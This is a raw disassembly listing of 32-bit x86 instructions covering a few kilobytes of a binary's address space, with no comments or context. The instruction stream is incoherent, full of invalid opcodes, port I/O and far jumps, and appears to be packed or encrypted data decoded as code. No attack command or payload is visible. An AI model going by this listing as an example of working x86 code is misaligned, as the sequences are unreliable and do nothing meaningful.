  40d7d7:	pop    ebx
  40d7d8:	dec    ecx
  40d7d9:	pusha  
  40d7da:	sbb    BYTE PTR [esi-0xf],0x7d
  40d7de:	repnz or DWORD PTR ds:0x152e00f5,eax
  40d7e5:	outs   dx,BYTE PTR ds:[esi]
  40d7e6:	sbb    ah,BYTE PTR [esp+ebx*4+0x10]
  40d7ea:	imul   esi,DWORD PTR [esi+0x6169615c],0xffffffeb
  40d7f1:	gs jmp 0xbefb:0xe80d2f41
  40d7f9:	mov    ebx,0x6da85433
  40d7fe:	sbb    al,0x8f
  40d800:	dec    esi
  40d801:	fnstcw WORD PTR [edi-0x5a7249da]
  40d807:	jbe    0x40d7b9
  40d809:	rcr    BYTE PTR [ecx-0x4d],0xf4
  40d80d:	jb     0x40d800
  40d80f:	or     BYTE PTR [edi],dl
  40d811:	arpl   WORD PTR [ecx+0x7d6036dc],sp
  40d817:	xchg   ebp,eax
  40d818:	pop    ebx
  40d819:	repz inc eax
  40d81b:	xor    eax,0xda361657
  40d820:	ins    DWORD PTR es:[edi],dx
  40d821:	or     BYTE PTR [ebx],bh
  40d823:	clc    
  40d824:	and    bl,BYTE PTR [ecx-0x7f]
  40d827:	pushf  
  40d828:	pop    esi
  40d829:	or     al,0xb6
  40d82b:	pop    ebp
  40d82c:	sub    ch,bl
  40d82e:	gs mov edx,0xa5465927
  40d834:	xor    edx,DWORD PTR [edx-0x7552250]
  40d83a:	rol    DWORD PTR [ebp+0x2604652],0xb3
  40d841:	repnz repz sub eax,0x20026b6
  40d848:	inc    ecx
  40d849:	ds ss call 0x618bd914
  40d850:	mov    ebp,DWORD PTR [ebp+0x1]
  40d853:	sbb    ebp,DWORD PTR [ebx+0x35]
  40d856:	push   DWORD PTR [ebx]
  40d858:	xor    al,0xe5
  40d85a:	ss adc dh,0x76
  40d85e:	jmp    0x4c6abe87
  40d863:	dec    edx
  40d864:	js     0x40d836
  40d866:	mov    eax,0x28d7d0b0
  40d86b:	dec    ecx
  40d86c:	push   edx
  40d86d:	cmp    eax,0xb0bf3cfd
  40d872:	mov    ah,0xb0
  40d874:	jbe    0x40d896
  40d876:	call   0xd897:0x10db0b5
  40d87d:	add    BYTE PTR [esp+ebp*8-0x4f],bl
  40d881:	ins    DWORD PTR es:[edi],dx
  40d882:	dec    ebx
  40d883:	retf   
  40d884:	add    dl,bl
  40d886:	(bad)  
  40d887:	fcmovb st,st(1)
  40d889:	cmp    esi,eax
  40d88b:	mov    edi,0x2c3d4dd
  40d890:	mov    al,0x15
  40d892:	push   ss
  40d893:	outs   dx,DWORD PTR ds:[esi]
  40d894:	pop    ds
  40d895:	mov    ds:0x636b6117,eax
  40d89a:	sub    ebp,DWORD PTR [ebx]
  40d89c:	and    esp,edi
  40d89e:	adc    ah,BYTE PTR [edx]
  40d8a0:	and    bl,BYTE PTR [ebx-0x2525a3ea]
  40d8a6:	jbe    0x40d832
  40d8a8:	push   cs
  40d8a9:	xchg   BYTE PTR [esi-0x163aee95],dl
  40d8af:	rcl    BYTE PTR [ecx+0xb],0xb
  40d8b3:	mov    bh,0xad
  40d8b5:	sbb    eax,0x71a4c23f
  40d8ba:	and    eax,0x2c55524e
  40d8bf:	pop    esp
  40d8c0:	fisubr DWORD PTR [eax+0x47]
  40d8c3:	(bad)  
  40d8c4:	push   esi
  40d8c5:	or     BYTE PTR [ebx],al
  40d8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8c8:	fist   WORD PTR [ecx+0x6e]
  40d8cb:	sbb    eax,0xb644adc1
  40d8d0:	mov    dl,0xcd
  40d8d2:	pop    edx
  40d8d3:	push   esi
  40d8d4:	xor    al,0x53
  40d8d6:	ins    DWORD PTR es:[edi],dx
  40d8d7:	mov    ah,0x85
  40d8d9:	or     eax,0xb11cfec5
  40d8de:	or     eax,DWORD PTR [ecx-0x3d29245d]
  40d8e4:	mov    dh,0x53
  40d8e6:	jbe    0x40d898
  40d8e8:	xchg   ebp,eax
  40d8e9:	push   0xffffff9a
  40d8eb:	fs je  0x40d938
  40d8ee:	js     0x40d910
  40d8f0:	loop   0x40d908
  40d8f2:	sbb    eax,DWORD PTR [esp+ebx*1+0x1418cd72]
  40d8f9:	fcomp  QWORD PTR [edx-0x18]
  40d8fc:	(bad)  
  40d8fe:	sbb    ebx,ecx
  40d900:	std    
  40d901:	dec    edi
  40d902:	xor    eax,0xc0858014
  40d907:	or     al,0x2f
  40d909:	sub    dl,BYTE PTR [esi+0x2db85e5c]
  40d90f:	inc    esi
  40d910:	aad    0xa4
  40d912:	mov    gs,WORD PTR [edx]
  40d914:	jg     0x40d94e
  40d916:	add    ch,ah
  40d918:	pop    edi
  40d919:	inc    esi
  40d91a:	push   esi
  40d91b:	test   al,0x76
  40d91d:	imul   ebp,edx,0xfffffff2
  40d920:	pop    esp
  40d921:	xor    al,0xe
  40d923:	adc    BYTE PTR [edx],bl
  40d925:	ret    0xe142
  40d928:	shl    BYTE PTR [ebp-0x20],cl
  40d92b:	popf   
  40d92c:	retf   0x1652
  40d92f:	(bad)  
  40d930:	out    dx,al
  40d931:	dec    ebx
  40d932:	pop    ebx
  40d933:	ins    DWORD PTR es:[edi],dx
  40d934:	fcmovnu st,st(4)
  40d936:	sbb    eax,0x41118694
  40d93b:	jne    0x40d8f0
  40d93d:	ss push ebx
  40d93f:	inc    edi
  40d940:	sbb    ebp,DWORD PTR [ebp-0x7a18e6bf]
  40d946:	out    dx,al
  40d947:	push   ss
  40d948:	add    eax,0x88b6b75a
  40d94d:	int    0x26
  40d94f:	(bad)  
  40d950:	mov    BYTE PTR [ebp+0xa],bl
  40d953:	fst    QWORD PTR [esi+0x7d04b71a]
  40d959:	mov    edi,0xa147929c
  40d95e:	jbe    0x40d9c9
  40d960:	stc    
  40d961:	push   es
  40d962:	fld    TBYTE PTR [ebp+0x598c8cb3]
  40d968:	dec    edx
  40d969:	addr16 pop ecx
  40d96b:	inc    eax
  40d96c:	add    BYTE PTR [esi],bl
  40d96e:	imul   ebp,DWORD PTR [esi],0xba696db5
  40d974:	ja     0x40d95d
  40d976:	clc    
  40d977:	mov    bh,0x11
  40d979:	xor    ah,BYTE PTR [ecx+0x2edb52b0]
  40d97f:	rol    BYTE PTR ds:0xf5bbb257,1
  40d985:	xchg   ecx,eax
  40d986:	push   eax
  40d987:	ds mov al,0xd0
  40d98a:	push   eax
  40d98b:	test   DWORD PTR [ebp-0x5165910c],edi
  40d991:	add    BYTE PTR [edi+0x7c1cba26],dh
  40d997:	pop    edx
  40d998:	loope  0x40d99f
  40d99a:	push   cs
  40d99b:	add    eax,0xedb6da60
  40d9a0:	(bad)  
  40d9a1:	jg     0x40d9da
  40d9a3:	push   esi
  40d9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a5:	in     al,dx
  40d9a6:	sbb    ah,BYTE PTR [esi]
  40d9a8:	imul   esp,ebp,0xffffff9e
  40d9ab:	cmp    DWORD PTR [esi],edx
  40d9ad:	mov    dh,0xb6
  40d9af:	xchg   BYTE PTR [ecx-0x53],bh
  40d9b2:	mov    ecx,0x9151d98a
  40d9b7:	fyl2xp1 
  40d9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ba:	mov    dh,0xdd
  40d9bc:	xchg   edx,eax
  40d9bd:	loopne 0x40d9a3
  40d9bf:	cwde   
  40d9c0:	aas    
  40d9c1:	adc    DWORD PTR ds:0xe800f7d7,ebx
  40d9c7:	sahf   
  40d9c8:	push   esi
  40d9c9:	ins    DWORD PTR es:[edi],dx
  40d9ca:	fild   DWORD PTR [esi-0x4f]
  40d9cd:	shr    BYTE PTR [esi-0xd],0xfb
  40d9d1:	mov    ecx,0x6d85add0
  40d9d6:	cmp    DWORD PTR [edx-0x7a3afd96],0x1768b896
  40d9e0:	dec    edx
  40d9e1:	fcomi  st,st(0)
  40d9e3:	hlt    
  40d9e4:	(bad)
  40d9e8:	and    ecx,DWORD PTR [esi+0x74]
  40d9eb:	ins    DWORD PTR es:[edi],dx
  40d9ec:	fild   DWORD PTR [edi+edx*1+0x24]
  40d9f0:	push   0x478c2140
  40d9f5:	es adc eax,0x50a163bc
  40d9fb:	push   0xe
  40d9fd:	hlt    
  40d9fe:	aaa    
  40d9ff:	mov    eax,0x5866f38d
  40da04:	push   0x258acb63
  40da09:	cwde   
  40da0a:	sbb    eax,0x6b6dbf67
  40da0f:	cmp    esp,eax
  40da11:	out    0x2e,al
  40da13:	xor    edi,edx
  40da15:	push   eax
  40da16:	cmp    ebx,DWORD PTR [edx+eiz*8-0x74]
  40da1a:	fild   DWORD PTR [esi-0x7]
  40da1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da1e:	xor    al,0x23
  40da20:	inc    edx
  40da21:	pop    ds
  40da22:	add    BYTE PTR [ebp+0x2c],bh
  40da25:	outs   dx,DWORD PTR ds:[esi]
  40da26:	je     0x40d9f0
  40da28:	ja     0x40d9e5
  40da2a:	shr    BYTE PTR [esi-0x53],1
  40da2d:	into   
  40da2e:	(bad)  
  40da2f:	cwde   
  40da30:	loope  0x40da5d
  40da32:	mov    edi,0x56f62782
  40da37:	pop    ebx
  40da38:	fcmovnbe st,st(2)
  40da3a:	inc    edx
  40da3b:	mov    ebx,0x4163a709
  40da40:	push   edx
  40da41:	dec    ecx
  40da42:	out    dx,eax
  40da43:	test   DWORD PTR [esi],eax
  40da45:	mov    edx,0x952f62b5
  40da4a:	jno    0x40da7f
  40da4c:	xchg   ebp,eax
  40da4d:	out    dx,eax
  40da4e:	int    0xb2
  40da50:	mov    ah,0x75
  40da52:	aam    0x8f
  40da54:	aad    0x36
  40da56:	xor    esi,DWORD PTR [ecx+0x1d]
  40da59:	fwait
  40da5a:	lods   al,BYTE PTR ds:[esi]
  40da5b:	sub    ch,BYTE PTR [esi+0x1b]
  40da5e:	fild   DWORD PTR [ebp+0x4d]
  40da61:	and    al,0x78
  40da63:	fwait
  40da64:	jge    0x40dab9
  40da66:	stos   BYTE PTR es:[edi],al
  40da67:	mov    ah,0x74
  40da69:	mov    eax,ds:0xf77ece0b
  40da6e:	inc    esi
  40da6f:	pop    edi
  40da70:	inc    ecx
  40da71:	lods   eax,DWORD PTR ds:[esi]
  40da72:	ret    0xb6d6
  40da75:	pop    ebp
  40da76:	mov    edi,0xddb93e04
  40da7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da7c:	jecxz  0x40da6c
  40da7e:	sbb    DWORD PTR [eax+0x68],ebx
  40da81:	pop    ebx
  40da82:	shl    edi,1
  40da84:	sub    al,al
  40da86:	imul   ebp,DWORD PTR [ecx-0x5c9c9e38],0xffffffdd
  40da8d:	pusha  
  40da8e:	jg     0x40da78
  40da90:	pop    esp
  40da91:	iret   
  40da92:	stos   DWORD PTR es:[edi],eax
  40da93:	test   al,0xca
  40da95:	add    DWORD PTR [esi+0x436dda36],esi
  40da9b:	mov    al,0x1a
  40da9d:	xchg   ecx,eax
  40da9e:	outs   dx,BYTE PTR ds:[esi]
  40da9f:	in     al,0x5
  40daa1:	push   ebp
  40daa2:	sub    al,0xd6
  40daa4:	push   ss
  40daa5:	outs   dx,BYTE PTR ds:[esi]
  40daa6:	xchg   BYTE PTR [esi+0x5],dl
  40daa9:	loop   0x40db21
  40daab:	xchg   edi,eax
  40daac:	rcr    BYTE PTR ds:0xdb0b6ed7,1
  40dab2:	ret    0xb5f3
  40dab5:	jmp    0x395d5725
  40daba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dabb:	lds    edx,FWORD PTR [ecx]
  40dabd:	pop    eax
  40dabe:	mov    edx,0x6b0b95b1
  40dac3:	outs   dx,BYTE PTR ds:[esi]
  40dac4:	ins    BYTE PTR es:[edi],dx
  40dac5:	(bad)  
  40dac6:	test   BYTE PTR [edi],ch
  40dac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dac9:	mov    cl,0x55
  40dacb:	pop    ebx
  40dacc:	pop    ebx
  40dacd:	and    ch,BYTE PTR ds:0x5e2047dd
  40dad3:	and    eax,ebx
  40dad5:	push   ss
  40dad6:	mov    dh,0xad
  40dad8:	loope  0x40db4b
  40dada:	sbb    ch,BYTE PTR [esi+esi*2]
  40dadd:	or     bl,BYTE PTR [esi-0x5692876b]
  40dae3:	pop    ebp
  40dae4:	pop    eax
  40dae5:	push   0xffffffbc
  40dae7:	pop    ds
  40dae8:	mov    WORD PTR [edx+ebp*4+0x3b],ss
  40daec:	mov    cl,ch
  40daee:	pop    ebx
  40daef:	push   0x3521b74b
  40daf4:	pop    edi
  40daf5:	stos   DWORD PTR es:[edi],eax
  40daf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf7:	(bad)  
  40daf8:	jp     0x40daee
  40dafa:	or     al,0xd4
  40dafd:	outs   dx,BYTE PTR ds:[esi]
  40dafe:	pop    ebp
  40daff:	jno    0x40daec
  40db01:	mov    edi,0x698983a2
  40db06:	dec    ebp
  40db07:	xchg   BYTE PTR [ebx+0x63],bl
  40db0a:	pop    ebx
  40db0b:	mov    edx,0x3510cd9e
  40db10:	imul   esi,DWORD PTR [ecx-0x72],0xffffff87
  40db14:	ds cmp al,0xc6
  40db17:	mov    dh,0x2d
  40db19:	ins    BYTE PTR es:[edi],dx
  40db1a:	fcomp  QWORD PTR [ebp-0x3dd1c1c5]
  40db21:	or     DWORD PTR [edi],edi
  40db23:	inc    edx
  40db24:	mov    ah,0xb
  40db26:	retf   
  40db27:	inc    ebp
  40db28:	stc    
  40db29:	xor    al,0xd2
  40db2b:	xor    DWORD PTR [ecx+0x0],ebx
  40db2e:	ret    0x8b56
  40db31:	fisubr DWORD PTR [eax+0x7a]
  40db34:	das    
  40db35:	pop    esi
  40db36:	cmp    bh,BYTE PTR [ebp+edi*8-0x20]
  40db3a:	push   esi
  40db3b:	jecxz  0x40dae4
  40db3d:	scas   al,BYTE PTR es:[edi]
  40db3e:	inc    ebp
  40db3f:	push   ebp
  40db40:	pop    edx
  40db41:	das    
  40db42:	sbb    bh,dl
  40db44:	mov    ecx,0xa16ddb6d
  40db49:	xchg   ebp,eax
  40db4a:	add    al,0x66
  40db4c:	xchg   al,al
  40db4e:	ins    BYTE PTR es:[edi],dx
  40db4f:	mov    edi,0x75c5027
  40db54:	mov    bh,0x6d
  40db56:	mov    ds:0x7770c0dd,eax
  40db5b:	mov    ah,0xcb
  40db5d:	outs   dx,DWORD PTR ds:[esi]
  40db5e:	jnp    0x40dbd4
  40db60:	push   0x67c1b5ad
  40db65:	pop    ecx
  40db66:	adc    ch,dh
  40db68:	retf   0x4b47
  40db6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db6c:	pop    edx
  40db6d:	pop    eax
  40db6e:	les    edx,FWORD PTR [esi]
  40db70:	add    al,0xb0
  40db72:	xlat   BYTE PTR ds:[ebx]
  40db73:	pop    edi
  40db74:	sar    DWORD PTR [ebx-0x254bd3d3],cl
  40db7a:	dec    ebp
  40db7b:	jo     0x40db0b
  40db7d:	push   0xd
  40db7f:	push   cs
  40db80:	inc    ebp
  40db81:	or     al,0x98
  40db83:	mov    BYTE PTR [edx-0x1f],0x46
  40db87:	or     DWORD PTR [edi-0x1ce980f9],ebp
  40db8d:	sub    bh,BYTE PTR [edx-0x5e12912f]
  40db93:	xchg   ecx,eax
  40db94:	mov    dh,0xc5
  40db96:	jmp    0xdbe4:0x4387d752
  40db9d:	test   DWORD PTR [esi],eax
  40db9f:	add    BYTE PTR [esp+esi*8-0xd69b25d],ch
  40dba6:	(bad)  
  40dba7:	fcmovb st,st(6)
  40dba9:	lods   eax,DWORD PTR ds:[esi]
  40dbaa:	ins    DWORD PTR es:[edi],dx
  40dbab:	fnsave [esi-0x7263e268]
  40dbb1:	mov    edx,0x746db074
  40dbb6:	adc    BYTE PTR [edi+0x21086347],dl
  40dbbc:	popf   
  40dbbd:	iret   
  40dbbe:	iret   
  40dbbf:	pop    ebx
  40dbc0:	popa   
  40dbc1:	mov    ebx,0xb1a0bfb1
  40dbc6:	fnstenv [edi+0x11]
  40dbc9:	xchg   ebx,eax
  40dbca:	mov    eax,0xdb4b6e8f
  40dbcf:	(bad)  
  40dbd0:	add    bh,BYTE PTR [edi]
  40dbd2:	mov    eax,edx
  40dbd4:	les    ecx,FWORD PTR [ecx-0x25d34f1e]
  40dbda:	pop    eax
  40dbdb:	call   0x5b294f62
  40dbe0:	rcr    BYTE PTR [ebx],1
  40dbe2:	push   esp
  40dbe3:	jne    0xe99b8904
  40dbe9:	xor    eax,0x8532e188
  40dbee:	pop    es
  40dbef:	ret    0x6db6
  40dbf2:	lea    edi,[edx+ebp*1+0x50]
  40dbf6:	xor    dh,BYTE PTR [ecx+0xd]
  40dbf9:	out    0xf9,al
  40dbfb:	adc    BYTE PTR [edi-0x1439244a],al
  40dc01:	lahf   
  40dc02:	ss push cs
  40dc04:	dec    eax
  40dc05:	mov    edx,0x6daa3535
  40dc0a:	imul   esi,DWORD PTR [edi],0xffffffb6
  40dc0d:	retf   0x2b7a
  40dc10:	cmp    eax,0x77da6477
  40dc15:	mov    eax,ds:0x51b5b86e
  40dc1a:	test   al,0x37
  40dc1c:	test   DWORD PTR [esi-0x2f],edi
  40dc1f:	pop    ebx
  40dc20:	cmp    eax,DWORD PTR [ecx+eax*4]
  40dc23:	push   0x56765451
  40dc28:	out    dx,al
  40dc29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc2a:	in     eax,dx
  40dc2b:	mov    dh,0x44
  40dc2d:	xor    DWORD PTR [edi-0x64d26ead],edi
  40dc33:	xchg   BYTE PTR [edi+0x6dbe5b76],cl
  40dc39:	or     BYTE PTR [ecx+ebx*2-0x24ff65b8],dh
  40dc40:	push   edi
  40dc41:	inc    esp
  40dc42:	sbb    al,0x33
  40dc44:	jno    0x40dc98
  40dc46:	sbb    eax,0xffffffda
  40dc49:	(bad)  
  40dc4a:	lods   eax,DWORD PTR ds:[esi]
  40dc4b:	ds int 0x63
  40dc4e:	mov    ecx,0xe142e96a
  40dc53:	mov    ebx,0xd4377957
  40dc58:	cli    
  40dc59:	sub    DWORD PTR [edx+0x7a585b6b],ebx
  40dc5f:	and    DWORD PTR [ebp+0x62],edx
  40dc62:	inc    edx
  40dc63:	add    al,0x14
  40dc65:	or     BYTE PTR [esi-0x7a7a520f],dl
  40dc6b:	jbe    0x40dca6
  40dc6d:	ss mov bl,0x43
  40dc70:	push   ebx
  40dc71:	std    
  40dc72:	sub    BYTE PTR [ecx+0x75],cl
  40dc75:	adc    BYTE PTR [edi-0x61fdf74a],dl
  40dc7b:	pop    edi
  40dc7c:	inc    esp
  40dc7d:	cmp    al,0x48
  40dc7f:	mov    edx,0x2dba5b5b
  40dc84:	out    0x73,al
  40dc86:	sahf   
  40dc87:	in     eax,dx
  40dc88:	inc    ebx
  40dc89:	enter  0x7423,0x77
  40dc8d:	(bad)  
  40dc8e:	xchg   edi,eax
  40dc8f:	xchg   esi,eax
  40dc90:	sbb    cl,BYTE PTR [eax-0x5bd768cf]
  40dc96:	pop    eax
  40dc97:	sbb    eax,0xdb521edc
  40dc9c:	adc    al,0x15
  40dc9e:	pop    ds
  40dc9f:	lahf   
  40dca0:	mov    eax,0x6c2dbc0b
  40dca5:	or     eax,0x29f92fed
  40dcaa:	or     bl,BYTE PTR [ecx-0x4d]
  40dcad:	cmp    BYTE PTR [edx],0x8a
  40dcb0:	mov    DWORD PTR [ebp+0x12ecb6a5],ebp
  40dcb6:	rol    DWORD PTR [ebx+0xd9255d3],1
  40dcbc:	fist   DWORD PTR [esi+0x5e816b7f]
  40dcc2:	mov    ch,0x2e
  40dcc4:	add    BYTE PTR [ebp+0x5b400b5],al
  40dcca:	cmp    bl,ch
  40dccc:	(bad)  
  40dccd:	push   eax
  40dcce:	mov    edx,0xc26c5ad0
  40dcd3:	cmp    bh,BYTE PTR [ecx-0x4ff92e1f]
  40dcd9:	mov    cl,0xb0
  40dcdb:	mov    DWORD PTR [edi-0x5cf0b4cc],edx
  40dce1:	or     BYTE PTR [ebp+0x37],ch
  40dce4:	fidivr DWORD PTR ss:[esi+0x16]
  40dce8:	js     0x40dd1d
  40dcea:	cmp    al,0x5b
  40dcec:	leave  
  40dced:	mov    dh,0x3
  40dcef:	pusha  
  40dcf0:	stos   DWORD PTR es:[edi],eax
  40dcf1:	pop    ebp
  40dcf2:	push   0xffffffc4
  40dcf4:	mov    ebx,?
  40dcf6:	jb     0x40dd54
  40dcf8:	mov    ds:0x6976b665,eax
  40dcfd:	pop    ecx
  40dcfe:	xchg   ebx,eax
  40dcff:	retf   
  40dd00:	bound  ebx,QWORD PTR ds:0x6277bf5d
  40dd06:	popa   
  40dd07:	inc    ecx
  40dd08:	fcom   QWORD PTR [esi-0x1fd1f46a]
  40dd0e:	add    esi,DWORD PTR [ebx+0x5b68f0a7]
  40dd14:	(bad)
  40dd17:	dec    esp
  40dd18:	jno    0x40dcc7
  40dd1a:	js     0x40dd7e
  40dd1c:	jge    0x40dcd4
  40dd1e:	adc    bl,BYTE PTR [ebp-0x28]
  40dd21:	add    edx,DWORD PTR [edx+0x37]
  40dd24:	test   eax,0x659b45e
  40dd29:	inc    edx
  40dd2a:	mov    ebx,0x98555b1
  40dd2f:	mov    bh,BYTE PTR [ebx]
  40dd31:	shl    DWORD PTR [ebx+0x46c6c28b],cl
  40dd37:	jmp    0xdbe58232
  40dd3c:	pop    ecx
  40dd3d:	mov    ah,0xcc
  40dd3f:	xor    al,0x50
  40dd41:	mov    edx,0x7156dbb5
  40dd46:	das    
  40dd47:	jmp    0x40dce4
  40dd49:	(bad)  
  40dd4b:	retf   
  40dd4c:	mov    eax,ds:0x6e89adb6
  40dd51:	push   ebx
  40dd52:	repnz mov esp,0x55e6bbb1
  40dd58:	inc    esp
  40dd59:	bound  ebp,QWORD PTR [edi-0x24]
  40dd5c:	fcom   DWORD PTR [esi]
  40dd5e:	call   0xd9237bd8
  40dd63:	stos   BYTE PTR es:[edi],al
  40dd64:	xor    ebp,DWORD PTR [edx]
  40dd66:	rol    DWORD PTR [eax],1
  40dd68:	xchg   al,bl
  40dd6a:	push   0x17
  40dd6c:	sahf   
  40dd6d:	mov    bh,0x42
  40dd6f:	or     BYTE PTR [edi-0x2e],0xd4
  40dd73:	std    
  40dd74:	popf   
  40dd75:	xor    al,0x62
  40dd77:	pop    ebx
  40dd78:	fsubr  DWORD PTR [ecx-0x50]
  40dd7b:	pop    eax
  40dd7c:	pop    ds
  40dd7d:	dec    edx
  40dd7e:	jbe    0x40dd7e
  40dd80:	ins    BYTE PTR es:[edi],dx
  40dd81:	xor    al,0xd0
  40dd83:	push   es
  40dd84:	test   bh,bh
  40dd86:	sahf   
  40dd87:	mov    ?,WORD PTR [esi+esi*4-0x4e44a45e]
  40dd8e:	addr16 cld 
  40dd90:	ins    DWORD PTR es:[edi],dx
  40dd91:	ins    DWORD PTR es:[edi],dx
  40dd92:	loopne 0x40dd38
  40dd94:	lock mov ebx,gs
  40dd97:	mov    dh,0x60
  40dd99:	jmp    0x1721:0x6a023792
  40dda0:	repnz xchg edx,eax
  40dda2:	mov    eax,0x541a3617
  40dda7:	ja     0x40dd39
  40dda9:	jg     0x40dd99
  40ddab:	aad    0xf2
  40ddad:	jbe    0x40de18
  40ddaf:	imul   edi,ecx,0xc2e100
  40ddb5:	leave  
  40ddb6:	mov    edx,0xd965ecc2
  40ddbb:	dec    esi
  40ddbc:	(bad)
  40ddbf:	fcmovnb st,st(6)
  40ddc1:	(bad)  
  40ddc2:	mov    ebp,0x300b71de
  40ddc7:	repnz mov ebp,0xd11a163
  40ddcd:	adc    BYTE PTR [ecx+0xb36c285],cl
  40ddd3:	ins    BYTE PTR es:[edi],dx
  40ddd4:	fwait
  40ddd5:	imul   esi,DWORD PTR [ecx+0x85a2fbf],0xb68bbd60
  40dddf:	ins    DWORD PTR es:[edi],dx
  40dde0:	xchg   edi,eax
  40dde1:	sbb    al,0x51
  40dde3:	and    ecx,DWORD PTR [edi+0x1d5cceba]
  40dde9:	das    
  40ddea:	mov    dh,0xa5
  40ddec:	test   DWORD PTR [ebp+0x347da4a5],eax
  40ddf2:	jp     0x40ddaf
  40ddf4:	js     0x40dd88
  40ddf6:	imul   esi,DWORD PTR [edi-0x1f223d73],0x5e
  40ddfd:	ins    BYTE PTR es:[edi],dx
  40ddfe:	jno    0x40dd80
  40de00:	pop    ebx
  40de01:	sub    BYTE PTR [ebx+0x14],ch
  40de04:	sub    eax,0x8e616162
  40de09:	jo     0x40de13
  40de0b:	push   ebp
  40de0c:	sub    eax,0x4bb46d13
  40de11:	dec    ebx
  40de12:	mov    WORD PTR [ebp+0x32],ds
  40de15:	aam    0x13
  40de17:	aam    0xd8
  40de19:	push   cs
  40de1a:	outs   dx,BYTE PTR ds:[esi]
  40de1b:	in     eax,dx
  40de1c:	mov    dh,0xb0
  40de1e:	push   eax
  40de1f:	in     eax,0x1
  40de21:	add    eax,DWORD PTR [ebx+0x4dc8fbec]
  40de27:	mov    ch,0x33
  40de29:	test   DWORD PTR [ebp+0x6b],ebp
  40de2c:	or     BYTE PTR [ecx+0x3],bl
  40de2f:	mov    eax,ds:0x4d0d4f6
  40de34:	jne    0x40de61
  40de36:	mov    bh,0x8d
  40de38:	sahf   
  40de39:	xchg   esi,eax
  40de3a:	sbb    ebp,0xffffffd4
  40de3d:	mov    al,0x14
  40de3f:	fdivr  QWORD PTR [ebp+eax*4-0x53]
  40de43:	and    DWORD PTR [edi+0x73],eax
  40de46:	into   
  40de47:	dec    ebx
  40de48:	xchg   al,cl
  40de4a:	inc    eax
  40de4b:	imul   ebx,ebp,0xffffffb6
  40de4e:	fiadd  DWORD PTR ds:0x6b6deca8
  40de54:	inc    edi
  40de55:	adc    edi,0xfffffffd
  40de58:	mov    DWORD PTR [esi-0x218f4f44],esi
  40de5e:	in     eax,dx
  40de5f:	test   esp,ecx
  40de61:	pop    ebx
  40de62:	rol    BYTE PTR [eax],0xfd
  40de65:	mov    dh,0xe
  40de67:	mov    edx,0x38edb5b0
  40de6c:	cdq    
  40de6d:	inc    edi
  40de6e:	jge    0x40de44
  40de70:	dec    ebp
  40de71:	dec    eax
  40de72:	adc    BYTE PTR [ecx],0xc5
  40de75:	fisubr DWORD PTR [ebp+0x69]
  40de78:	sti    
  40de79:	dec    ecx
  40de7a:	mov    ecx,ebp
  40de7c:	cli    
  40de7d:	jge    0x40de69
  40de7f:	adc    ch,BYTE PTR gs:[ebp+0x4bb5b04a]
  40de86:	add    DWORD PTR cs:[edx],0x112671f1
  40de8d:	jbe    0x40de9b
  40de8f:	or     ebp,DWORD PTR [ebp-0x45]
  40de92:	popa   
  40de93:	scas   al,BYTE PTR es:[edi]
  40de94:	add    al,BYTE PTR cs:[eax-0x20cf3b35]
  40de9b:	call   0x114f5f42
  40dea0:	pop    edi
  40dea1:	aad    0x5d
  40dea3:	pop    ebx
  40dea4:	aaa    
  40dea5:	inc    edi
  40dea6:	test   ecx,esp
  40dea8:	loop   0x40dec7
  40deaa:	out    0x30,al
  40deac:	pop    eax
  40dead:	mov    ebx,0x685b6163
  40deb2:	mov    edi,0x55d4964f
  40deb7:	sbb    al,0x5e
  40deb9:	lahf   
  40deba:	fst    QWORD PTR [esi-0x5f9b9e81]
  40dec0:	adc    ebp,esp
  40dec2:	add    BYTE PTR [edi-0x3882ffda],dh
  40dec8:	out    0x15,al
  40deca:	imul   ecx,DWORD PTR [ebp+0x6e2db6a5],0x2038a15b
  40ded4:	jge    0x40de68
  40ded6:	and    DWORD PTR [ebp-0x57256896],0x9b115942
  40dee0:	icebp  
  40dee1:	adc    BYTE PTR [edi],0x6d
  40dee4:	ins    BYTE PTR es:[edi],dx
  40dee5:	in     eax,dx
  40dee6:	add    ch,BYTE PTR [edi-0x79]
  40dee9:	push   0x3caf6b02
  40deee:	push   esi
  40deef:	mov    ebx,0x38ba54b1
  40def4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40def5:	lods   al,BYTE PTR ds:[esi]
  40def6:	outs   dx,BYTE PTR ds:[esi]
  40def7:	lds    ebx,FWORD PTR [ecx]
  40def9:	add    BYTE PTR [edi],al
  40defb:	mov    DWORD PTR [ebx+ebx*8+0x4d5bb5b8],esp
  40df02:	or     edx,esp
  40df04:	inc    edi
  40df05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df06:	inc    ebx
  40df07:	sbb    al,0x45
  40df09:	ficom  DWORD PTR [ebp+0x6d442db4]
  40df0f:	js     0x40deeb
  40df11:	cmp    ch,BYTE PTR [ecx+0x6c70b57a]
  40df17:	pop    ebx
  40df18:	push   ebx
  40df19:	cwde   
  40df1a:	xchg   ecx,eax
  40df1b:	sbb    eax,0x939e9e6a
  40df20:	ins    BYTE PTR es:[edi],dx
  40df21:	fist   DWORD PTR [edx+0x23]
  40df24:	mov    esi,DWORD PTR [edx]
  40df26:	addr16 fwait
  40df28:	inc    esp
  40df29:	mov    edi,0x2db5b01c
  40df2e:	sub    al,0x10
  40df30:	mov    bl,0xe5
  40df32:	and    eax,0xfdfafa1
  40df37:	mov    dh,0x6d
  40df39:	mov    bh,0x46
  40df3b:	call   0xe15:0x98af89f8
  40df42:	push   ebx
  40df43:	dec    ebp
  40df44:	mov    ch,0xb5
  40df46:	push   0xffffff81
  40df48:	ss daa 
  40df4a:	call   0xc2cebec3
  40df4f:	mov    dh,0xb5
  40df51:	push   0xffffffa3
  40df53:	mov    eax,0x6a2af5b1
  40df58:	shl    DWORD PTR [ecx],0xd8
  40df5b:	outs   dx,DWORD PTR cs:[esi]
  40df5d:	frstor [edi-0x19324c00]
  40df63:	dec    edx
